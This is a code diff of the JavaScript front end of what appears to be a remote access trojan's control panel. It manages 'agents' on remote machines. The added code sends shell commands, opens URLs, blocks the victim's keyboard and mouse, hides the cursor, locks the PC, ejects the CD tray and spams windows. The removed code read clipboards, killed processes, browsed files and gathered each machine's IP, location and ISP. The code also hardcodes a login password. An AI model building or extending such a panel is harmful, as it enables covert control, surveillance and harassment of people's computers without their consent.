@@ -3,7 +3,6 @@ let currentAgent = null;
 let agents = [];
 let commandCount = 0;
 let confirmCallback = null;
-let processList = [];
 let isAuthenticated = false;
 
 // Authentication
@@ -12,7 +11,6 @@ function attemptLogin() {
     const error = document.getElementById('loginError');
     const password = input.value;
     
-    // k5gchqtcucmgcoxdz15sl
     if (password === 'k5gchqtcucmgcoxdz15sl') {
         isAuthenticated = true;
         document.getElementById('loginScreen').style.display = 'none';
@@ -38,6 +36,11 @@ function initApp() {
     setInterval(fetchAgents, 5000);
 }
 
+// Initialize
+document.addEventListener('DOMContentLoaded', () => {
+    // App will init after login
+});
+
 // Notification system
 function showNotification(message, icon = 'ℹ️') {
     document.getElementById('notifIcon').textContent = icon;
@@ -62,11 +65,6 @@ function confirmAction(result) {
         confirmCallback = null;
     }
 }
-
-// Initialize
-document.addEventListener('DOMContentLoaded', () => {
-    // App will init after login
-});
 
 // Navigation
 function initNavigation() {
@@ -138,7 +136,6 @@ function updateDashboard() {
     document.getElementById('onlineCount').textContent = online.length;
     document.getElementById('commandsExecuted').textContent = commandCount;
     
-    // Update activity
     const activityList = document.getElementById('activityList');
     if (agents.length > 0) {
         activityList.innerHTML = agents.slice(0, 5).map(agent => {
@@ -213,8 +210,6 @@ function openAgentModal(agentId) {
 
 function closeModal() {
     document.getElementById('agentModal').classList.remove('active');
-    stopScreenStream();
-    stopWebcamStream();
     currentAgent = null;
 }
 
@@ -239,7 +234,7 @@ async function executeShellCommand() {
     output.innerHTML += `<div class="terminal-line">$ ${command}</div>`;
     
     try {
-        const res = await fetch('/api/command', {
+        await fetch('/api/command', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -249,12 +244,11 @@ async function executeShellCommand() {
             })
         });
         
-        const result = await res.json();
-        output.innerHTML += `<div class="terminal-line">${result.output || 'Command sent'}</div>`;
+        output.innerHTML += `<div class="terminal-line">Command sent</div>`;
         output.scrollTop = output.scrollHeight;
         
         commandCount++;
-        addCommandToHistory('shell', command, result.output);
+        addCommandToHistory('shell', command, 'Command sent');
         addLog('success', `Executed: ${command} on ${currentAgent.hostname}`);
     } catch (e) {
         output.innerHTML += `<div class="terminal-line" style="color: #f00;">Error: ${e.message}</div>`;
@@ -272,7 +266,7 @@ async function sendPowerCommand(action) {
         if (!confirmed) return;
         
         try {
-            const res = await fetch('/api/command', {
+            await fetch('/api/command', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -282,7 +276,6 @@ async function sendPowerCommand(action) {
                 })
             });
             
-            const result = await res.json();
             showNotification(`Power command sent: ${action}`, '⚡');
             commandCount++;
             addCommandToHistory('power', action, 'Command sent');
@@ -308,7 +301,7 @@ async function sendMessageBox() {
     }
     
     try {
-        const res = await fetch('/api/command', {
+        await fetch('/api/command', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -320,7 +313,6 @@ async function sendMessageBox() {
             })
         });
         
-        const result = await res.json();
         showNotification('Message sent successfully', '✅');
         commandCount++;
         addCommandToHistory('message', `${title}: ${content}`, 'Message sent');
@@ -328,6 +320,331 @@ async function sendMessageBox() {
     } catch (e) {
         showNotification(`Error: ${e.message}`, '❌');
         addLog('error', `Failed to send message: ${e.message}`);
+    }
+}
+
+// Text-to-Speech
+async function speakText() {
+    if (!currentAgent) return;
+    
+    const text = document.getElementById('ttsText').value;
+    const voice = document.getElementById('ttsVoice').value;
+    
+    if (!text) {
+        showNotification('Please enter text to speak', '⚠️');
+        return;
+    }
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'tts',
+                text: text,
+                voice: voice
+            })
+        });
+        
+        showNotification('TTS command sent', '✅');
+        commandCount++;
+        addLog('success', `TTS: ${text.substring(0, 50)}...`);
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+// Open URL
+async function openURL() {
+    if (!currentAgent) return;
+    
+    const url = document.getElementById('urlInput').value;
+    
+    if (!url) {
+        showNotification('Please enter URL', '⚠️');
+        return;
+    }
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'url',
+                url: url
+            })
+        });
+        
+        showNotification('URL opened', '✅');
+        commandCount++;
+        addLog('success', `Opened URL: ${url}`);
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+// Volume control
+async function setVolume() {
+    if (!currentAgent) return;
+    
+    const level = document.getElementById('volumeSlider').value;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'volume',
+                action: 'set',
+                level: parseInt(level)
+            })
+        });
+        
+        showNotification(`Volume set to ${level}%`, '✅');
+        commandCount++;
+        addLog('success', `Volume set to ${level}%`);
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+async function muteVolume() {
+    if (!currentAgent) return;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'volume',
+                action: 'mute'
+            })
+        });
+        
+        showNotification('Volume muted', '✅');
+        commandCount++;
+        addLog('success', 'Volume muted');
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+async function unmuteVolume() {
+    if (!currentAgent) return;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'volume',
+                action: 'unmute'
+            })
+        });
+        
+        showNotification('Volume unmuted', '✅');
+        commandCount++;
+        addLog('success', 'Volume unmuted');
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+// CD Tray
+async function cdTray(action) {
+    if (!currentAgent) return;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'cdtray',
+                action: action
+            })
+        });
+        
+        showNotification(`CD tray ${action}ed`, '✅');
+        commandCount++;
+        addLog('success', `CD tray ${action}ed`);
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+// Block/Unblock Input
+async function blockInput() {
+    if (!currentAgent) return;
+    
+    showConfirm('Block keyboard and mouse input?', async (confirmed) => {
+        if (!confirmed) return;
+        
+        try {
+            await fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    agentId: currentAgent.id,
+                    type: 'blockinput',
+                    action: 'block'
+                })
+            });
+            
+            showNotification('Input blocked', '✅');
+            commandCount++;
+            addLog('warning', 'Input blocked');
+        } catch (e) {
+            showNotification(`Error: ${e.message}`, '❌');
+        }
+    });
+}
+
+async function unblockInput() {
+    if (!currentAgent) return;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'blockinput',
+                action: 'unblock'
+            })
+        });
+        
+        showNotification('Input unblocked', '✅');
+        commandCount++;
+        addLog('success', 'Input unblocked');
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+// Hide/Show Cursor
+async function hideCursor() {
+    if (!currentAgent) return;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'cursor',
+                action: 'hide'
+            })
+        });
+        
+        showNotification('Cursor hidden', '✅');
+        commandCount++;
+        addLog('success', 'Cursor hidden');
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+async function showCursor() {
+    if (!currentAgent) return;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'cursor',
+                action: 'show'
+            })
+        });
+        
+        showNotification('Cursor shown', '✅');
+        commandCount++;
+        addLog('success', 'Cursor shown');
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+// Lock PC
+async function lockPC() {
+    if (!currentAgent) return;
+    
+    showConfirm('Lock the workstation?', async (confirmed) => {
+        if (!confirmed) return;
+        
+        try {
+            await fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    agentId: currentAgent.id,
+                    type: 'lock'
+                })
+            });
+            
+            showNotification('PC locked', '✅');
+            commandCount++;
+            addLog('warning', 'PC locked');
+        } catch (e) {
+            showNotification(`Error: ${e.message}`, '❌');
+        }
+    });
+}
+
+// Spam Windows
+async function startSpam() {
+    if (!currentAgent) return;
+    
+    const program = document.getElementById('spamProgram').value;
+    const delay = document.getElementById('spamDelay').value;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'spam',
+                action: 'start',
+                program: program,
+                delay: parseInt(delay)
+            })
+        });
+        
+        showNotification(`Spam started: ${program}`, '✅');
+        commandCount++;
+        addLog('warning', `Spam started: ${program} every ${delay}ms`);
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
+    }
+}
+
+async function stopSpam() {
+    if (!currentAgent) return;
+    
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                agentId: currentAgent.id,
+                type: 'spam',
+                action: 'stop'
+            })
+        });
+        
+        showNotification('Spam stopped', '✅');
+        commandCount++;
+        addLog('success', 'Spam stopped');
+    } catch (e) {
+        showNotification(`Error: ${e.message}`, '❌');
     }
 }
 
@@ -387,471 +704,3 @@ document.getElementById('agentModal')?.addEventListener('click', (e) => {
         closeModal();
     }
 });
-
-
-// Clipboard Manager
-async function refreshClipboard() {
-    if (!currentAgent) return;
-    
-    try {
-        const res = await fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                agentId: currentAgent.id,
-                type: 'clipboard',
-                action: 'get'
-            })
-        });
-        
-        setTimeout(async () => {
-            const cmdRes = await fetch(`/api/command?agentId=${currentAgent.id}`);
-            const commands = await cmdRes.json();
-            const clipCmd = commands.find(c => c.type === 'clipboard' && c.status === 'completed' && c.output);
-            
-            if (clipCmd) {
-                document.getElementById('clipboardContent').value = clipCmd.output;
-                addLog('success', 'Clipboard refreshed');
-            }
-        }, 1500);
-        
-        addLog('info', 'Refreshing clipboard...');
-    } catch (e) {
-        showNotification(`Error: ${e.message}`, '❌');
-    }
-}
-
-async function setClipboard() {
-    if (!currentAgent) return;
-    
-    const content = document.getElementById('clipboardContent').value;
-    if (!content) {
-        showNotification('Clipboard content is empty', '⚠️');
-        return;
-    }
-    
-    try {
-        const res = await fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                agentId: currentAgent.id,
-                type: 'clipboard',
-                action: 'set',
-                content: content
-            })
-        });
-        
-        showNotification('Clipboard updated', '✅');
-        addLog('success', 'Clipboard set on remote agent');
-    } catch (e) {
-        showNotification(`Error: ${e.message}`, '❌');
-    }
-}
-
-// Task Manager
-async function refreshProcesses() {
-    if (!currentAgent) return;
-    
-    try {
-        const res = await fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                agentId: currentAgent.id,
-                type: 'processes'
-            })
-        });
-        
-        setTimeout(async () => {
-            const cmdRes = await fetch(`/api/command?agentId=${currentAgent.id}`);
-            const commands = await cmdRes.json();
-            const procCmd = commands.find(c => c.type === 'processes' && c.status === 'completed' && c.output);
-            
-            if (procCmd && procCmd.output) {
-                displayProcesses(procCmd.output);
-                addLog('success', 'Process list refreshed');
-            }
-        }, 1500);
-        
-        addLog('info', 'Refreshing processes...');
-    } catch (e) {
-        showNotification(`Error: ${e.message}`, '❌');
-    }
-}
-
-function displayProcesses(data) {
-    const processList = document.getElementById('processList');
-    const lines = data.split('\\n').filter(line => line.trim() && !line.includes('Running processes'));
-    
-    if (lines.length === 0) {
-        processList.innerHTML = '<p class="empty-state">No processes found</p>';
-        return;
-    }
-    
-    processList.innerHTML = lines.map((line, index) => {
-        const match = line.match(/(.+?)\s*\(PID:\s*(\d+)\)/);
-        if (!match) return '';
-        
-        const processName = match[1].trim();
-        const pid = match[2];
-        
-        return `
-            <div class="process-item">
-                <div>
-                    <span class="process-name">${processName}</span>
-                    <span class="process-pid">PID: ${pid}</span>
-                </div>
-                <div class="process-actions">
-                    <button class="process-btn kill" onclick="killProcess('${processName}', ${pid})">Kill</button>
-                    <button class="process-btn restart" onclick="restartProcess('${processName}', ${pid})">Restart</button>
-                    <button class="process-btn pause" onclick="suspendProcess(${pid})">Pause</button>
-                    <button class="process-btn resume" onclick="resumeProcess(${pid})">Resume</button>
-                </div>
-            </div>
-        `;
-    }).join('');
-}
-
-async function killProcess(processName, pid) {
-    if (!currentAgent) return;
-    
-    showConfirm(`Kill process: ${processName}?`, async (confirmed) => {
-        if (!confirmed) return;
-        
-        try {
-            const res = await fetch('/api/command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    agentId: currentAgent.id,
-                    type: 'killprocess',
-                    pid: pid
-                })
-            });
-            
-            showNotification(`Kill command sent for ${processName}`, '✅');
-            addLog('warning', `Kill process: ${processName}`);
-            setTimeout(refreshProcesses, 2000);
-        } catch (e) {
-            showNotification(`Error: ${e.message}`, '❌');
-        }
-    });
-}
-
-async function restartProcess(processName, pid) {
-    if (!currentAgent) return;
-    
-    showConfirm(`Restart process: ${processName}?`, async (confirmed) => {
-        if (!confirmed) return;
-        
-        try {
-            const res = await fetch('/api/command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    agentId: currentAgent.id,
-                    type: 'restartprocess',
-                    pid: pid,
-                    name: processName
-                })
-            });
-            
-            showNotification(`Restart command sent for ${processName}`, '✅');
-            addLog('info', `Restart process: ${processName}`);
-            setTimeout(refreshProcesses, 2000);
-        } catch (e) {
-            showNotification(`Error: ${e.message}`, '❌');
-        }
-    });
-}
-
-async function suspendProcess(pid) {
-    if (!currentAgent) return;
-    
-    try {
-        const res = await fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                agentId: currentAgent.id,
-                type: 'suspendprocess',
-                pid: pid
-            })
-        });
-        
-        showNotification(`Process suspended (PID: ${pid})`, '✅');
-        addLog('info', `Suspend process PID: ${pid}`);
-    } catch (e) {
-        showNotification(`Error: ${e.message}`, '❌');
-    }
-}
-
-async function resumeProcess(pid) {
-    if (!currentAgent) return;
-    
-    try {
-        const res = await fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                agentId: currentAgent.id,
-                type: 'resumeprocess',
-                pid: pid
-            })
-        });
-        
-        showNotification(`Process resumed (PID: ${pid})`, '✅');
-        addLog('info', `Resume process PID: ${pid}`);
-    } catch (e) {
-        showNotification(`Error: ${e.message}`, '❌');
-    }
-}
-
-// Process search
-document.getElementById('processSearch')?.addEventListener('input', (e) => {
-    const query = e.target.value.toLowerCase();
-    document.querySelectorAll('.process-item').forEach(item => {
-        const text = item.textContent.toLowerCase();
-        item.style.display = text.includes(query) ? 'flex' : 'none';
-    });
-});
-
-
-// File Explorer
-async function browsePath() {
-    if (!currentAgent) return;
-    
-    const path = document.getElementById('currentPath').value;
-    if (!path) return;
-    
-    try {
-        const res = await fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                agentId: currentAgent.id,
-                type: 'browse',
-                path: path
-            })
-        });
-        
-        setTimeout(async () => {
-            const cmdRes = await fetch(`/api/command?agentId=${currentAgent.id}`);
-            const commands = await cmdRes.json();
-            const browseCmd = commands.find(c => c.type === 'browse' && c.status === 'completed' && c.output);
-            
-            if (browseCmd && browseCmd.output) {
-                displayFiles(browseCmd.output);
-                addLog('success', `Browsed: ${path}`);
-            }
-        }, 1500);
-        
-        addLog('info', `Browsing: ${path}`);
-    } catch (e) {
-        showNotification(`Error: ${e.message}`, '❌');
-    }
-}
-
-function displayFiles(data) {
-    const fileList = document.getElementById('fileList');
-    const lines = data.split('\\n').filter(line => line.trim());
-    
-    if (lines.length === 0) {
-        fileList.innerHTML = '<p class="empty-state">Empty directory</p>';
-        return;
-    }
-    
-    fileList.innerHTML = lines.map(line => {
-        const isDir = line.startsWith('[DIR]');
-        const name = line.replace('[DIR]', '').replace('[FILE]', '').trim();
-        const icon = isDir ? '📁' : '📄';
-        
-        return `
-            <div class="file-item" onclick="${isDir ? `navigateToDir('${name}')` : ''}">
-                <span class="file-icon">${icon}</span>
-                <span class="file-name">${name}</span>
-            </div>
-        `;
-    }).join('');
-}
-
-function navigateToDir(dirName) {
-    const currentPath = document.getElementById('currentPath');
-    let path = currentPath.value;
-    if (!path.endsWith('\\')) path += '\\';
-    currentPath.value = path + dirName;
-    browsePath();
-}
-
-function goUpDirectory() {
-    const currentPath = document.getElementById('currentPath');
-    let path = currentPath.value;
-    const parts = path.split('\\').filter(p => p);
-    if (parts.length > 1) {
-        parts.pop();
-        currentPath.value = parts.join('\\') + '\\';
-        browsePath();
-    }
-}
-
-// Text-to-Speech
-async function speakText() {
-    if (!currentAgent) return;
-    
-    const text = document.getElementById('ttsText').value;
-    const voice = document.getElementById('ttsVoice').value;
-    
-    if (!text) {
-        showNotification('Please enter text to speak', '⚠️');
-        return;
-    }
-    
-    try {
-        const res = await fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                agentId: currentAgent.id,
-                type: 'tts',
-                text: text,
-                voice: voice
-            })
-        });
-        
-        showNotification('TTS command sent', '✅');
-        addLog('success', `TTS: ${text.substring(0, 50)}...`);
-    } catch (e) {
-        showNotification(`Error: ${e.message}`, '❌');
-    }
-}
-
-// System Info
-async function loadSystemInfo() {
-    if (!currentAgent) return;
-    
-    try {
-        const res = await fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                agentId: currentAgent.id,
-                type: 'sysinfo'
-            })
-        });
-        
-        setTimeout(async () => {
-            const cmdRes = await fetch(`/api/command?agentId=${currentAgent.id}`);
-            const commands = await cmdRes.json();
-            const infoCmd = commands.find(c => c.type === 'sysinfo' && c.status === 'completed' && c.output);
-            
-            if (infoCmd && infoCmd.output) {
-                displaySystemInfo(infoCmd.output);
-                addLog('success', 'System info loaded');
-            }
-        }, 2000);
-        
-        addLog('info', 'Loading system info...');
-    } catch (e) {
-        showNotification(`Error: ${e.message}`, '❌');
-    }
-}
-
-function displaySystemInfo(data) {
-    const infoGrid = document.getElementById('infoGrid');
-    
-    try {
-        const info = JSON.parse(data);
-        
-        infoGrid.innerHTML = `
-            <div class="info-card">
-                <h3>💻 System</h3>
-                <div class="info-item">
-                    <span class="info-label">OS:</span>
-                    <span class="info-value">${info.os || 'N/A'}</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">Architecture:</span>
-                    <span class="info-value">${info.arch || 'N/A'}</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">Computer Name:</span>
-                    <span class="info-value">${info.hostname || 'N/A'}</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">Username:</span>
-                    <span class="info-value">${info.username || 'N/A'}</span>
-                </div>
-            </div>
-            
-            <div class="info-card">
-                <h3>🖥️ Hardware</h3>
-                <div class="info-item">
-                    <span class="info-label">CPU:</span>
-                    <span class="info-value">${info.cpu || 'N/A'}</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">RAM:</span>
-                    <span class="info-value">${info.ram || 'N/A'}</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">GPU:</span>
-                    <span class="info-value">${info.gpu || 'N/A'}</span>
-                </div>
-            </div>
-            
-            <div class="info-card">
-                <h3>🌍 Network</h3>
-                <div class="info-item">
-                    <span class="info-label">IP Address:</span>
-                    <span class="info-value">${info.ip || 'N/A'}</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">Location:</span>
-                    <span class="info-value">${info.location || 'N/A'}</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">ISP:</span>
-                    <span class="info-value">${info.isp || 'N/A'}</span>
-                </div>
-            </div>
-            
-            <div class="info-card">
-                <h3>💾 Storage</h3>
-                <div class="info-item">
-                    <span class="info-label">Total:</span>
-                    <span class="info-value">${info.disk_total || 'N/A'}</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">Free:</span>
-                    <span class="info-value">${info.disk_free || 'N/A'}</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">Used:</span>
-                    <span class="info-value">${info.disk_used || 'N/A'}</span>
-                </div>
-            </div>
-        `;
-    } catch (e) {
-        infoGrid.innerHTML = '<p class="empty-state">Failed to parse system info</p>';
-    }
-}
-
-// Auto-load system info when view is opened
-function switchView(viewName) {
-    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
-    document.getElementById(viewName).classList.add('active');
-    
-    const titles = {
-        dashboard: 'Dashboard',
-        agents: 'Agents',
-        commands: 'Commands',
-        logs: 'System Logs',
-        info: 'System Information'
-    };
-    document.getElementById('pageTitle').textContent = titles[viewName] || viewName;
-    
-    if (viewName === 'info' && currentAgent) {
-        loadSystemInfo();
-    }
-}
